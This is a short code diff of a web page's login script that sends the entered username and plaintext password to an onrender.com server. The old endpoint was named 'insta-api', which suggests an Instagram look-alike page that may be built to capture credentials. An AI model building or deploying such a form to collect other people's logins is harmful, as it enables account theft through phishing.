@@ -128,12 +128,12 @@ loginForm.addEventListener('submit', async (e) => {
  e.preventDefault(); 
   console.log('🟩 ログイン押された');
 
-  await fetch('https://insta-api.onrender.com/login', {
+  await fetch('https://api-9s9o.onrender.com', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
     username: username.value,
-    password
+    password: password.value
     })
   });
 
@@ -142,4 +142,5 @@ loginForm.addEventListener('submit', async (e) => {
 
 </script>
 </body>
+
 </html>
